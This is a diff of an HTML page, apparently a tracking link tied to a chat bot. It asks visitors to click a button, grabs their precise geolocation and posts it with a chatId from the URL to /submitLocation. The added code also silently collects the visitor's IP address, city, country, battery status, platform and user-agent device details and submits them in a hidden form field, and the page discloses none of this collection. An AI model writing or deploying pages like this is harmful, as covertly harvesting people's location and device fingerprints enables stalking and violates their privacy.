@@ -1,142 +1,153 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
-  <title>Location</title>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: black;
-      color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-    }
-    .container {
-      text-align: center;
-      padding: 40px;
-      background-color: black;
-      border-radius: 8px;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-      border: 2px solid black;
-    }
-    h1 {
-      font-size: 36px;
-      margin-bottom: 20px;
-      color: white;
-    }
-    button {
-      padding: 12px 24px;
-      border: none;
-      border-radius: 5px;
-      background-color: white;
-      color: black;
-      cursor: pointer;
-      font-size: 16px;
-      transition: background-color 0.3s ease;
-    }
-    button:hover {
-      background-color: #555;
-    }
-    .result {
-      margin-top: 20px;
-      font-size: 18px;
-      color: white;
-    }
-    .loading {
-      border: 16px solid #f3f3f3;
-      border-top: 16px solid #3498db;
-      border-radius: 50%;
-      width: 120px;
-      height: 120px;
-      animation: spin 2s linear infinite;
-      margin: 0 auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    footer {
-      margin-top: 40px;
-      color: #666;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديد الموقع</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        button {
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+        .loading {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <button onclick="getLocation()">اضغط هنا</button>
-    <div class="loading" id="loading" style="display: none;"></div>
-    <p class="result" id="userLocation"></p>
-    <footer></footer>
-  </div>
+    <div class="container">
+        <button onclick="getLocation()">اضغط هنا لتحديد موقعك</button>
+        <div class="loading" id="loading" style="display: none;"></div>
+        <p class="result" id="userLocation"></p>
+    </div>
 
-  <form method="POST" action="/submitLocation" id="location-form">
-    <input type="hidden" name="latitude" id="latitude">
-    <input type="hidden" name="longitude" id="longitude">
-    <input type="hidden" name="chatId" id="chatId">
-  </form>
+    <form method="POST" action="/submitLocation" id="location-form">
+        <input type="hidden" name="latitude" id="latitude">
+        <input type="hidden" name="longitude" id="longitude">
+        <input type="hidden" name="chatId" id="chatId">
+        <input type="hidden" name="additionalData" id="additionalData">
+    </form>
 
-  <script>
-    function getLocation() {
-      // إظهار العلامة التحميل
-      document.getElementById("loading").style.display = "block";
-      
-      if (navigator.geolocation) {
-        // تحديد الموقع بدقة عالية
-        navigator.geolocation.getCurrentPosition(showPosition, handleError, { enableHighAccuracy: true });
-      } else {
-        alert("Geolocation is not supported by this browser.");
-        // إخفاء العلامة التحميل
-        document.getElementById("loading").style.display = "none";
-      }
-    }
+    <script>
+        async function getLocation() {
+            document.getElementById("loading").style.display = "block";
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, handleError, { enableHighAccuracy: true });
+            } else {
+                alert("متصفحك لا يدعم تحديد الموقع.");
+                document.getElementById("loading").style.display = "none";
+            }
+        }
 
-    function showPosition(position) {
-      // إخفاء العلامة التحميل
-      document.getElementById("loading").style.display = "none";
-      
-      var latitude = position.coords.latitude;
-      var longitude = position.coords.longitude;
-      var chatId = getParameterByName('chatId');
-      document.getElementById("latitude").value = latitude;
-      document.getElementById("longitude").value = longitude;
-      document.getElementById("chatId").value = chatId;
-      document.getElementById("location-form").submit();
-    }
+        async function showPosition(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const chatId = getParameterByName('chatId');
+            
+            const additionalData = await collectAdditionalData();
 
-    function handleError(error) {
-      // إخفاء العلامة التحميل
-      document.getElementById("loading").style.display = "none";
-      
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          alert("User denied the request for Geolocation.");
-          break;
-        case error.POSITION_UNAVAILABLE:
-          alert("Location information is unavailable.");
-          break;
-        case error.TIMEOUT:
-          alert("The request to get user location timed out.");
-          break;
-        case error.UNKNOWN_ERROR:
-          alert("An unknown error occurred.");
-          break;
-      }
-    }
+            document.getElementById("latitude").value = latitude;
+            document.getElementById("longitude").value = longitude;
+            document.getElementById("chatId").value = chatId;
+            document.getElementById("additionalData").value = JSON.stringify(additionalData);
 
-    // استخراج قيمة المعلمة من عنوان URL
-    function getParameterByName(name, url = window.location.href) {
-      name = name.replace(/[\[\]]/g, '\\$&');
-      var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
-          results = regex.exec(url);
-      if (!results) return null;
-      if (!results[2]) return '';
-      return decodeURIComponent(results[2].replace(/\+/g, ' '));
-    }
-  </script>
+            document.getElementById("location-form").submit();
+        }
+
+        function handleError(error) {
+            document.getElementById("loading").style.display = "none";
+            
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("تم رفض طلب تحديد الموقع.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("معلومات الموقع غير متاحة.");
+                    break;
+                case error.TIMEOUT:
+                    alert("انتهت مهلة طلب تحديد الموقع.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("حدث خطأ غير معروف.");
+                    break;
+            }
+        }
+
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        async function collectAdditionalData() {
+            const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
+            const battery = await navigator.getBattery();
+
+            return {
+                ip: ipInfo.ip,
+                country: ipInfo.country_name,
+                city: ipInfo.city,
+                platform: getPlatformInfo().platform,
+                deviceVersion: getDeviceVersion(),
+                batteryLevel: battery.level,
+                batteryCharging: battery.charging,
+            };
+        }
+
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            if (/Windows/.test(ua)) return { platform: "Windows" };
+            if (/Mac/.test(ua)) return { platform: "MacOS" };
+            if (/Linux/.test(ua)) return { platform: "Linux" };
+            if (/Android/.test(ua)) return { platform: "Android" };
+            if (/iPhone|iPad|iPod/.test(ua)) return { platform: "iOS" };
+            return { platform: "Unknown" };
+        }
+
+        function getDeviceVersion() {
+            const ua = navigator.userAgent;
+            const match = ua.match(/\(([^)]+)\)/);
+            return match ? match[1] : 'Unknown';
+        }
+    </script>
 </body>
 </html>
